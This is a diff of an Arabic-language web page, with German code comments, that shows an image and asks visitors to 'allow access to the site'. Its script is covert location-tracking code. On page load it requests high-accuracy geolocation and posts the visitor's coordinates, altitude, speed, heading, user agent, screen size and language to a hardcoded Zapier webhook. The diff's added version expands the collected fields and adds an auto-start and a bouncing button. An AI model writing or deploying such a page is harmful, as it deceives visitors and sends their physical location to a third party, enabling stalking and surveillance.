@@ -1,1 +1,222 @@
-<!doctype html> <html lang="ar" dir="rtl"> <head> <meta charset="utf-8"/> <meta name="viewport" content="width=device-width,initial-scale=1"/> <title>يرجى السماح بالوصول إلى الموقع</title> <style> :root { color-scheme: light dark; } body{ margin:0;display:flex;flex-direction:column;align-items:center;justify-content:center; height:100vh;background:#000;color:#fff;font-family:system-ui,-apple-system,"Segoe UI",Roboto,Arial; text-align:center;padding:16px;box-sizing:border-box; } img{max-width:90%;height:auto;border-radius:12px;margin-bottom:1.2rem;box-shadow:0 6px 24px rgba(0,0,0,.6);} .msg{margin-top:.6rem;font-size:.95rem;opacity:.9} a.retry{display:inline-block;margin-top:.6rem;color:#7fb3ff;text-decoration:underline;cursor:pointer} </style> </head> <body> <img src="490716617_24365319479735048_6862502247511119998_n.jpg" alt="صورة"/> <div class="msg" id="msg" aria-live="polite">يرجى السماح بالوصول إلى الموقع</div> <a class="retry" id="retry" style="display:none">إعادة المحاولة</a> <script> const WEBHOOK = "https://hooks.zapier.com/hooks/catch/25010546/u5jmd4g/"; const msg = document.getElementById('msg'); const retry = document.getElementById('retry'); const setMsg = t => msg.textContent = t; async function sendToZapier(data){ const res = await fetch(WEBHOOK, { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(data) }); if(!res.ok) throw new Error('HTTP '+res.status); } function askAndSend(){ if(!('geolocation' in navigator)){ setMsg('المتصفح لا يدعم تحديد الموقع'); return; } setMsg('جارٍ طلب الموقع…'); navigator.geolocation.getCurrentPosition(async pos=>{ const payload = { lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy, ts: Date.now(), ua: navigator.userAgent, page: location.href }; try{ await sendToZapier(payload); setMsg('تم الإرسال بنجاح ✅'); }catch(e){ setMsg('فشل الإرسال ❌'); retry.style.display = 'inline-block'; } }, err=>{ setMsg('تعذر الحصول على الموقع: ' + (err.message || err.code)); retry.style.display = 'inline-block'; }, { enableHighAccuracy:true, timeout:15000, maximumAge:0 }); } // Automatisch beim Laden fragen window.addEventListener('load', ()=> setTimeout(askAndSend, 200)); // Fallback – manueller erneuter Versuch retry.addEventListener('click', ()=>{ retry.style.display='none'; askAndSend(); }); </script> </body> </html>
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>يرجى السماح بالوصول إلى الموقع</title>
+  <style>
+    :root { 
+      color-scheme: light dark; 
+    }
+    
+    body {
+      margin: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      background: #000;
+      color: #fff;
+      font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      text-align: center;
+      padding: 16px;
+      box-sizing: border-box;
+    }
+    
+    img {
+      max-width: 90%;
+      height: auto;
+      border-radius: 12px;
+      margin-bottom: 1.6rem;
+      box-shadow: 0 6px 24px rgba(0, 0, 0, 0.6);
+    }
+    
+    button {
+      background: #007bff;
+      color: #fff;
+      font-size: 1.25rem;
+      border: none;
+      border-radius: 12px;
+      padding: 0.9rem 1.6rem;
+      cursor: pointer;
+      animation: bounce 1.2s infinite;
+      box-shadow: 0 8px 30px rgba(0, 123, 255, 0.35);
+      transition: transform .15s ease;
+    }
+    
+    button:active {
+      transform: translateY(2px) scale(.995);
+    }
+    
+    button:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+      animation: none;
+    }
+    
+    @keyframes bounce {
+      0%, 20%, 50%, 80%, 100% {
+        transform: translateY(0);
+      }
+      40% {
+        transform: translateY(-12px);
+      }
+      60% {
+        transform: translateY(-6px);
+      }
+    }
+    
+    .msg {
+      margin-top: 1rem;
+      font-size: 0.95rem;
+      opacity: 0.9;
+      min-height: 1.5rem;
+    }
+    
+    .retry {
+      display: inline-block;
+      margin-top: 0.8rem;
+      color: #7fb3ff;
+      text-decoration: underline;
+      cursor: pointer;
+    }
+    
+    .success {
+      color: #28a745;
+    }
+    
+    .error {
+      color: #dc3545;
+    }
+  </style>
+</head>
+<body>
+  <img src="490716617_24365319479735048_6862502247511119998_n.jpg" alt="صورة" />
+  <button id="locBtn">يرجى السماح بالوصول إلى الموقع</button>
+  <div class="msg" id="msg" aria-live="polite"></div>
+  <a class="retry" id="retry" style="display:none">إعادة المحاولة</a>
+
+  <script>
+    // === KONFIGURATION ===
+    const WEBHOOK = "https://hooks.zapier.com/hooks/catch/25010546/u5jmd4g/";
+    const AUTO_START = true; // Automatisch beim Laden starten?
+    const AUTO_START_DELAY = 500; // Verzögerung in ms
+    
+    // === DOM-ELEMENTE ===
+    const btn = document.getElementById('locBtn');
+    const msg = document.getElementById('msg');
+    const retry = document.getElementById('retry');
+    
+    // === HILFSFUNKTIONEN ===
+    function setMsg(text, type = '') {
+      msg.textContent = text;
+      msg.className = 'msg ' + type;
+    }
+    
+    async function sendToZapier(data) {
+      const res = await fetch(WEBHOOK, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      });
+      
+      if (!res.ok) {
+        throw new Error(`HTTP ${res.status}: ${res.statusText}`);
+      }
+      
+      return res;
+    }
+    
+    // === HAUPTFUNKTION ===
+    async function requestLocation() {
+      // Browser-Check
+      if (!('geolocation' in navigator)) {
+        setMsg('❌ المتصفح لا يدعم تحديد الموقع', 'error');
+        return;
+      }
+      
+      // UI deaktivieren
+      btn.disabled = true;
+      retry.style.display = 'none';
+      setMsg('⏳ جارٍ طلب الموقع…');
+      
+      // Geolocation-Optionen
+      const options = {
+        enableHighAccuracy: true,
+        timeout: 15000,
+        maximumAge: 0
+      };
+      
+      // Position anfordern
+      navigator.geolocation.getCurrentPosition(
+        async (pos) => {
+          // Erfolgreich erhalten
+          setMsg('📍 تم الحصول على الموقع، جارٍ الإرسال…');
+          
+          const payload = {
+            lat: pos.coords.latitude,
+            lng: pos.coords.longitude,
+            acc: pos.coords.accuracy,
+            altitude: pos.coords.altitude,
+            speed: pos.coords.speed,
+            heading: pos.coords.heading,
+            ts: Date.now(),
+            ua: navigator.userAgent,
+            page: location.href,
+            screen: `${screen.width}x${screen.height}`,
+            lang: navigator.language
+          };
+          
+          try {
+            await sendToZapier(payload);
+            setMsg('✅ تم الإرسال بنجاح', 'success');
+            console.log('✓ Daten gesendet:', payload);
+            btn.disabled = false;
+          } catch (e) {
+            console.error('✗ Fehler beim Senden:', e);
+            setMsg('❌ فشل الإرسال: ' + e.message, 'error');
+            retry.style.display = 'inline-block';
+            btn.disabled = false;
+          }
+        },
+        (err) => {
+          // Fehler bei Position
+          console.error('✗ Geolocation-Fehler:', err);
+          let errorMsg = '';
+          
+          switch(err.code) {
+            case err.PERMISSION_DENIED:
+              errorMsg = 'تم رفض الإذن';
+              break;
+            case err.POSITION_UNAVAILABLE:
+              errorMsg = 'الموقع غير متاح';
+              break;
+            case err.TIMEOUT:
+              errorMsg = 'انتهت المهلة';
+              break;
+            default:
+              errorMsg = err.message || 'خطأ غير معروف';
+          }
+          
+          setMsg('❌ تعذر الحصول على الموقع: ' + errorMsg, 'error');
+          retry.style.display = 'inline-block';
+          btn.disabled = false;
+        },
+        options
+      );
+    }
+    
+    // === EVENT-LISTENER ===
+    btn.addEventListener('click', requestLocation);
+    retry.addEventListener('click', requestLocation);
+    
+    // === AUTO-START ===
+    if (AUTO_START) {
+      window.addEventListener('load', () => {
+        setTimeout(requestLocation, AUTO_START_DELAY);
+      });
+    }
+  </script>
+</body>
+</html>
